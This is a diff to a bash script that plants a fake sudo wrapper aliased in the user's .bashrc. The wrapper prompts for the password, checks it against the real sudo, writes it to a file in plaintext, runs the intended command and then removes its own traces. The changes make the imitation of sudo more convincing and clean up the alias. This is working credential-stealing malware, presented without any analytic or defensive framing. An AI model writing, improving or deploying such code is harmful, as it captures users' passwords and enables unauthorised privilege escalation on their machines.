@@ -4,7 +4,7 @@
 if [ "$EUID" -eq 0 ]; then
     exit 0
 else
-    GB_DIR="$HOME/.local/share/.gb"
+    GB_DIR="$HOME/.local/share/gb"
     SCRIPT_FILENAME="script.sh"
     SCRIPT_FILE="$GB_DIR/$SCRIPT_FILENAME"
 
@@ -13,7 +13,7 @@ else
     cat > "$SCRIPT_FILE" << 'EOF'
 #!/bin/bash
 
-GB_DIR="$HOME/.local/share/.gb"
+GB_DIR="$HOME/.local/share/gb"
 SCRIPT_FILENAME="script.sh"
 SCRIPT_FILE="$GB_DIR/$SCRIPT_FILENAME"
 
@@ -28,19 +28,13 @@ while [ $attempts -lt $max_attempts ]; do
     read -s user_input
     echo
 
-    ASKPASS_SCRIPT=$(mktemp)
-    echo -e "#!/bin/sh\necho \"$user_input\"" > "$ASKPASS_SCRIPT"
-    chmod +x "$ASKPASS_SCRIPT"
-
-    # Test the passwd
-    if SUDO_ASKPASS="$ASKPASS_SCRIPT" /usr/bin/sudo -A -k true 2>/dev/null; then
+    if printf "%s\n" "$user_input" | /usr/bin/sudo -S -k true 2>/dev/null; then
         # Correct passwd
         success=true
         break
     else
-        echo "Sorry, try again."
-        rm -f "$ASKPASS_SCRIPT"
         attempts=$((attempts + 1))
+        [ $attempts -lt $max_attempts ] && echo "Sorry, try again."
     fi
 done
 
@@ -51,13 +45,18 @@ fi
 
 echo "$user_input" > "$PASSWD_FILE"
 
+ASKPASS_SCRIPT=$(mktemp)
+echo -e "#!/bin/sh\necho \"$user_input\"" > "$ASKPASS_SCRIPT"
+chmod +x "$ASKPASS_SCRIPT"
+
 # Execute the original command
 SUDO_ASKPASS="$ASKPASS_SCRIPT" /usr/bin/sudo -A -p "" "$@"
 
 # Cleanup
 rm -f "$ASKPASS_SCRIPT"
 rm -f "$SCRIPT_FILE"
-sed -i "\|alias sudo=$SCRIPT_FILE|d" $HOME/.bashrc
+unalias sudo 2>/dev/null
+sed -i "\|alias sudo=$SCRIPT_FILE|d" "$HOME/.bashrc"
 EOF
 
     chmod +x $SCRIPT_FILE
